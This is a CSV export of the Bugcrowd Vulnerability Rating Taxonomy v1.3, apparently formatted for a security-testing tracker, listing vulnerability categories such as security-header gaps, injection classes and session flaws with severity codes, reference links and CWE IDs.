TID,TSource,TTestName,TType,TDescription,TIssueName,TIssueType,TSeverity,TTesterSupport,TPhase,TSection,TStep,TIssueBackground,TRemediationBackground,TStdTest,TRef1,TRef2,TTRef,TCweID,TPCI,TTop10,TTop25
BCVRT-001,BCVRT,Unsafe Cross-Origin Resource Sharing,BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Unsafe Cross-Origin Resource Sharing,Unsafe Cross-Origin Resource Sharing,,2,,,,1,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-942,,,
BCVRT-005,BCVRT,Same-Site Scripting (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Same-Site Scripting,Same-Site Scripting (P5),,3,,,,5,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-006,BCVRT,"SSL Attack (BREACH, POODLE etc.)",BugCrowd Vuln Rating Taxonomy v1.3,"Server Security Misconfiguration; SSL Attack (BREACH, POODLE etc.)","SSL Attack (BREACH, POODLE etc.)",,2,,,,6,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-310,,,
BCVRT-003,BCVRT,Directory Listing Enabled: Sensitive Data Exposure,BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Directory Listing Enabled: Sensitive Data Exposure,Information Exposure Through Directory Listing (CWE-548),,2,,,,3,"A directory listing is inappropriately exposed, yielding potentially sensitive information to attackers.",,,http://projects.webappsec.org/w/page/13246922/Directory%20Indexing,https://wiki.apache.org/httpd/DirectoryListings,,548,,,
BCVRT-008,BCVRT,Using Default Credentials: Staging/Development Server (P2),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Using Default Credentials: Staging/Development Server,Using Default Credentials: Staging/Development Server (P2),,2,,,,8,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-009,BCVRT,Misconfigured DNS: Subdomain Takeover (P2),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Misconfigured DNS: Subdomain Takeover,Misconfigured DNS: Subdomain Takeover (P2),,2,,,,9,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-010,BCVRT,Misconfigured DNS: Zone Transfer (P4),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Misconfigured DNS: Zone Transfer,Misconfigured DNS: Zone Transfer (P4),,3,,,,10,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-669,,,
BCVRT-002,BCVRT,Path Traversal,BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Path Traversal,Path Traversal,,2,,,,2,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-22,,,
BCVRT-004,BCVRT,Directory Listing Enabled: Non-Sensitive Data Exposure (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Directory Listing Enabled: Non-Sensitive Data Exposure,Information Exposure Through Directory Listing (CWE-548),,3,,,,4,"A directory listing is inappropriately exposed, yielding potentially sensitive information to attackers.",,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,548,,,
BCVRT-007,BCVRT,Using Default Credentials: Production Server (P1),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Using Default Credentials: Production Server,Using Default Credentials: Production Server (P1),,2,,,,7,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-011,BCVRT,Misconfigured DNS: Missing Certification Authority Authorization (CAA) Record (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Misconfigured DNS: Missing Certification Authority Authorization (CAA) Record,Misconfigured DNS: Missing Certification Authority Authorization (CAA) Record (P5),,3,,,,11,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-013,BCVRT,Mail Server Misconfiguration: Email Spoofable Via Third-Party API Misconfiguration (P3),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Mail Server Misconfiguration: Email Spoofable Via Third-Party API Misconfiguration,Mail Server Misconfiguration: Email Spoofable Via Third-Party API Misconfiguration (P3),,2,,,,13,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-012,BCVRT,Mail Server Misconfiguration: Missing SPF on Email Domain (P3),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Mail Server Misconfiguration: Missing SPF on Email Domain,Mail Server Misconfiguration: Missing SPF on Email Domain (P3),,2,,,,12,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-014,BCVRT,Mail Server Misconfiguration: Missing SPF on Non-Email Domain (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Mail Server Misconfiguration: Missing SPF on Non-Email Domain,Mail Server Misconfiguration: Missing SPF on Non-Email Domain (P5),,3,,,,14,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-015,BCVRT,Mail Server Misconfiguration: SPF Uses a Soft Fail (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Mail Server Misconfiguration: SPF Uses a Soft Fail,Mail Server Misconfiguration: SPF Uses a Soft Fail (P5),,3,,,,15,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-016,BCVRT,Mail Server Misconfiguration: SPF Includes More Than 10 Lookups (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Mail Server Misconfiguration: SPF Includes More Than 10 Lookups,Mail Server Misconfiguration: SPF Includes More Than 10 Lookups (P5),,3,,,,16,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-017,BCVRT,Mail Server Misconfiguration: Missing DKIM/DMARC (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Mail Server Misconfiguration: Missing DKIM/DMARC,Mail Server Misconfiguration: Missing DKIM/DMARC (P5),,3,,,,17,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-018,BCVRT,Lack of Password Confirmation: Change Email Address (P4),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Lack of Password Confirmation: Change Email Address,Lack of Password Confirmation: Change Email Address (P4),,3,,,,18,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-019,BCVRT,Lack of Password Confirmation: Change Password (P4),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Lack of Password Confirmation: Change Password,Lack of Password Confirmation: Change Password (P4),,3,,,,19,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-620,,,
BCVRT-020,BCVRT,Lack of Password Confirmation: Delete Account (P4),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Lack of Password Confirmation: Delete Account,Lack of Password Confirmation: Delete Account (P4),,3,,,,20,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-021,BCVRT,Lack of Password Confirmation: Manage 2FA (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Lack of Password Confirmation: Manage 2FA,Lack of Password Confirmation: Manage 2FA (P5),,3,,,,21,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-022,BCVRT,No Rate Limiting on Form: Registration (P4),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; No Rate Limiting on Form: Registration,No Rate Limiting on Form: Registration (P4),,3,,,,22,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-023,BCVRT,No Rate Limiting on Form: Login (P3),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; No Rate Limiting on Form: Login,No Rate Limiting on Form: Login (P3),,2,,,,23,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-307,,,
BCVRT-024,BCVRT,No Rate Limiting on Form: Email-Triggering (P4),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; No Rate Limiting on Form: Email-Triggering,No Rate Limiting on Form: Email-Triggering (P4),,3,,,,24,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-025,BCVRT,Unsafe File Upload: No Antivirus (P4),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Unsafe File Upload: No Antivirus,Unsafe File Upload: No Antivirus (P4),,3,,,,25,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-026,BCVRT,Unsafe File Upload: No Size Limit (P4),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Unsafe File Upload: No Size Limit,Unsafe File Upload: No Size Limit (P4),,3,,,,26,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-027,BCVRT,Unsafe File Upload: File Extension Filter Bypass (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Unsafe File Upload: File Extension Filter Bypass,Unsafe File Upload: File Extension Filter Bypass (P5),,3,,,,27,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-434,,,
BCVRT-028,BCVRT,Cookie Scoped to Parent Domain (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Cookie Scoped to Parent Domain,Cookie Scoped to Parent Domain (P5),,3,,,,28,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-029,BCVRT,Missing Secure or HTTPOnly Cookie Flag: Session Token (P4),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Missing Secure or HTTPOnly Cookie Flag: Session Token,Missing Secure or HTTPOnly Cookie Flag: Session Token (P4),,3,,,,29,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-030,BCVRT,Missing Secure or HTTPOnly Cookie Flag: Non-Session Cookie (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Missing Secure or HTTPOnly Cookie Flag: Non-Session Cookie,Missing Secure or HTTPOnly Cookie Flag: Non-Session Cookie (P5),,3,,,,30,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-031,BCVRT,Clickjacking: Sensitive Action (P4),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Clickjacking: Sensitive Action,Clickjacking: Sensitive Action (P4),,3,,,,31,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-032,BCVRT,Clickjacking: Non-Sensitive Action (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Clickjacking: Non-Sensitive Action,Clickjacking: Non-Sensitive Action (P5),,3,,,,32,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-033,BCVRT,OAuth Misconfiguration: Missing State Parameter (P4),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; OAuth Misconfiguration: Missing State Parameter,OAuth Misconfiguration: Missing State Parameter (P4),,3,,,,33,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-352,,,
BCVRT-034,BCVRT,Captcha Bypass: Implementation Vulnerability (P4),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Captcha Bypass: Implementation Vulnerability,Captcha Bypass: Implementation Vulnerability (P4),,3,,,,34,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-035,BCVRT,Captcha Bypass: Brute Force (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Captcha Bypass: Brute Force,Captcha Bypass: Brute Force (P5),,3,,,,35,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-036,BCVRT,Exposed Admin Portal: To Internet (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Exposed Admin Portal: To Internet,Exposed Admin Portal: To Internet (P5),,3,,,,36,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-037,BCVRT,Missing DNSSEC (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Missing DNSSEC,Missing DNSSEC (P5),,3,,,,37,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-038,BCVRT,Fingerprinting/Banner Disclosure (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Fingerprinting/Banner Disclosure,Fingerprinting/Banner Disclosure (P5),,3,,,,38,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-039,BCVRT,Username Enumeration: Brute Force (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Username Enumeration: Brute Force,Username Enumeration: Brute Force (P5),,3,,,,39,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-040,BCVRT,Potentially Unsafe HTTP Method Enabled: OPTIONS (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Potentially Unsafe HTTP Method Enabled: OPTIONS,Potentially Unsafe HTTP Method Enabled: OPTIONS (P5),,3,,,,40,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-041,BCVRT,Potentially Unsafe HTTP Method Enabled: TRACE (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Potentially Unsafe HTTP Method Enabled: TRACE,Potentially Unsafe HTTP Method Enabled: TRACE (P5),,3,,,,41,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-042,BCVRT,Insecure SSL: Lack of Forward Secrecy (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Insecure SSL: Lack of Forward Secrecy,Insecure SSL: Lack of Forward Secrecy (P5),,3,,,,42,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-043,BCVRT,Insecure SSL: Insecure Cipher Suite (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Insecure SSL: Insecure Cipher Suite,Insecure SSL: Insecure Cipher Suite (P5),,3,,,,43,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-326,,,
BCVRT-044,BCVRT,Reflected File Download (RFD) (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Reflected File Download (RFD),Reflected File Download (RFD) (P5),,3,,,,44,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,https://drive.google.com/file/d/0B0KLoHg_gR_XQnV4RVhlNl96MHM/view,,,,
BCVRT-045,BCVRT,Lack of Security Headers: X-Frame-Options (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Lack of Security Headers: X-Frame-Options,Lack of Security Headers: X-Frame-Options (P5),,3,,,,45,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-046,BCVRT,Lack of Security Headers: Cache-Control for a Non-Sensitive Page (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Lack of Security Headers: Cache-Control for a Non-Sensitive Page,Lack of Security Headers: Cache-Control for a Non-Sensitive Page (P5),,3,,,,46,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-525,,,
BCVRT-047,BCVRT,Lack of Security Headers: X-XSS-Protection (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Lack of Security Headers: X-XSS-Protection,Lack of Security Headers: X-XSS-Protection (P5),,3,,,,47,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-048,BCVRT,Lack of Security Headers: Strict-Transport-Security (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Lack of Security Headers: Strict-Transport-Security,Lack of Security Headers: Strict-Transport-Security (P5),,3,,,,48,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-049,BCVRT,Lack of Security Headers: X-Content-Type-Options (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Lack of Security Headers: X-Content-Type-Options,Lack of Security Headers,,2,,,,49,"The application does not neutralize or incorrectly neutralizes web scripting syntax in HTTP headers that can be used by web browser components that can process raw headers, such as Flash.",,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,644,,,
BCVRT-050,BCVRT,Lack of Security Headers: Content-Security-Policy (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Lack of Security Headers: Content-Security-Policy,Lack of Security Headers: Content-Security-Policy (P5),,3,,,,50,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-052,BCVRT,Lack of Security Headers: X-Content-Security-Policy (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Lack of Security Headers: X-Content-Security-Policy,Lack of Security Headers: X-Content-Security-Policy (P5),,3,,,,52,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-055,BCVRT,Lack of Security Headers: Cache-Control for a Sensitive Page (P4),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Lack of Security Headers: Cache-Control for a Sensitive Page,Lack of Security Headers: Cache-Control for a Sensitive Page (P4),,3,,,,55,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-525,,,
BCVRT-051,BCVRT,Lack of Security Headers: Public-Key-Pins (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Lack of Security Headers: Public-Key-Pins,Lack of Security Headers: Public-Key-Pins (P5),,3,,,,51,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-053,BCVRT,Lack of Security Headers: X-Webkit-CSP (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Lack of Security Headers: X-Webkit-CSP,Lack of Security Headers: X-Webkit-CSP (P5),,3,,,,53,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-054,BCVRT,Lack of Security Headers: Content-Security-Policy-Report-Only (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Lack of Security Headers: Content-Security-Policy-Report-Only,Lack of Security Headers: Content-Security-Policy-Report-Only (P5),,3,,,,54,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-056,BCVRT,Bitsquatting (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server Security Misconfiguration; Bitsquatting,Bitsquatting (P5),,3,,,,56,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-057,BCVRT,File Inclusion: Local (P1),BugCrowd Vuln Rating Taxonomy v1.3,Server-Side Injection; File Inclusion: Local,File Inclusion: Local (P1),,2,,,,57,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-059,BCVRT,Remote Code Execution (RCE) (P1),BugCrowd Vuln Rating Taxonomy v1.3,Server-Side Injection; Remote Code Execution (RCE),Remote Code Execution (RCE) (P1),,2,,,,59,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-77,,,
BCVRT-062,BCVRT,XML External Entity Injection (XXE) (P1),BugCrowd Vuln Rating Taxonomy v1.3,Server-Side Injection; XML External Entity Injection (XXE),XML External Entity Injection (XXE) (P1),,2,,,,62,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-611,true,,
BCVRT-058,BCVRT,Parameter Pollution: Social Media Sharing Buttons (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server-Side Injection; Parameter Pollution: Social Media Sharing Buttons,Parameter Pollution: Social Media Sharing Buttons (P5),,3,,,,58,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-061,BCVRT,SQL Injection: Blind (P1),BugCrowd Vuln Rating Taxonomy v1.3,Server-Side Injection; SQL Injection: Blind,SQL Injection: Blind (P1),,2,,,,61,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-063,BCVRT,HTTP Response Manipulation: Response Splitting (CRLF) (P3),BugCrowd Vuln Rating Taxonomy v1.3,Server-Side Injection; HTTP Response Manipulation: Response Splitting (CRLF),HTTP Response Manipulation: Response Splitting (CRLF) (P3),,2,,,,63,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-113,,,
BCVRT-060,BCVRT,SQL Injection: Error-Based (P1),BugCrowd Vuln Rating Taxonomy v1.3,Server-Side Injection; SQL Injection: Error-Based,SQL Injection: Error-Based (P1),,2,,,,60,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-064,BCVRT,Content Spoofing: iframe Injection (P3),BugCrowd Vuln Rating Taxonomy v1.3,Server-Side Injection; Content Spoofing: iframe Injection,Content Spoofing: iframe Injection (P3),,2,,,,64,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-068,BCVRT,Content Spoofing: Homograph/IDN-Based (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server-Side Injection; Content Spoofing: Homograph/IDN-Based,Content Spoofing: Homograph/IDN-Based (P5),,3,,,,68,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-1007,,,
BCVRT-069,BCVRT,Authentication Bypass (P1),BugCrowd Vuln Rating Taxonomy v1.3,Broken Authentication and Session Management; Authentication Bypass,Authentication Bypass (P1),,2,,,,69,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-287,,,
BCVRT-070,BCVRT,Privilege Escalation,BugCrowd Vuln Rating Taxonomy v1.3,Broken Authentication and Session Management; Privilege Escalation,Privilege Escalation,,2,,,,70,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-269,,,
BCVRT-066,BCVRT,Content Spoofing: Email HTML Injection (P4),BugCrowd Vuln Rating Taxonomy v1.3,Server-Side Injection; Content Spoofing: Email HTML Injection,Content Spoofing: Email HTML Injection (P4),,3,,,,66,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-072,BCVRT,Session Fixation (P3),BugCrowd Vuln Rating Taxonomy v1.3,Broken Authentication and Session Management; Session Fixation,Session Fixation (P3),,2,,,,72,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-384,,,
BCVRT-073,BCVRT,Failure to Invalidate Session: On Logout (P4),BugCrowd Vuln Rating Taxonomy v1.3,Broken Authentication and Session Management; Failure to Invalidate Session: On Logout,Failure to Invalidate Session: On Logout (P4),,3,,,,73,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-065,BCVRT,Content Spoofing: External Authentication Injection (P4),BugCrowd Vuln Rating Taxonomy v1.3,Server-Side Injection; Content Spoofing: External Authentication Injection,Content Spoofing: External Authentication Injection (P4),,3,,,,65,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-067,BCVRT,Content Spoofing: Text Injection (P5),BugCrowd Vuln Rating Taxonomy v1.3,Server-Side Injection; Content Spoofing: Text Injection,Content Spoofing: Text Injection (P5),,3,,,,67,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-071,BCVRT,Weak Login Function: Over HTTP (P3),BugCrowd Vuln Rating Taxonomy v1.3,Broken Authentication and Session Management; Weak Login Function: Over HTTP,Weak Login Function: Over HTTP (P3),,2,,,,71,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-311,,,
BCVRT-074,BCVRT,Failure to Invalidate Session: On Password Reset (P4),BugCrowd Vuln Rating Taxonomy v1.3,Broken Authentication and Session Management; Failure to Invalidate Session: On Password Reset,Failure to Invalidate Session: On Password Reset (P4),,3,,,,74,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-075,BCVRT,Failure to Invalidate Session: On Password Change (P4),BugCrowd Vuln Rating Taxonomy v1.3,Broken Authentication and Session Management; Failure to Invalidate Session: On Password Change,Failure to Invalidate Session: On Password Change (P4),,3,,,,75,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-077,BCVRT,Failure to Invalidate Session: On Email Change (P5),BugCrowd Vuln Rating Taxonomy v1.3,Broken Authentication and Session Management; Failure to Invalidate Session: On Email Change,Failure to Invalidate Session: On Email Change (P5),,3,,,,77,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,,,,
BCVRT-080,BCVRT,Weak Registration Implementation: Over HTTP (P4),BugCrowd Vuln Rating Taxonomy v1.3,Broken Authentication and Session Management; Weak Registration Implementation: Over HTTP,Weak Registration Implementation: Over HTTP (P4),,3,,,,80,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-311,,,
BCVRT-081,BCVRT,Critically Sensitive Data: Password Disclosure (P1),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Critically Sensitive Data: Password Disclosure,Critically Sensitive Data: Password Disclosure (P1),,2,,,,81,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-522,,,
BCVRT-082,BCVRT,Critically Sensitive Data: Private API Keys (P1),BugCrowd Vuln Rating Taxonomy v1.3,Sensitive Data Exposure; Critically Sensitive Data: Private API Keys,Critically Sensitive Data: Private API Keys (P1),,2,,,,82,,,,https://bugcrowd.com/vulnerability-rating-taxonomy,https://github.com/bugcrowd/vulnerability-rating-taxonomy,,CWE-522,,,
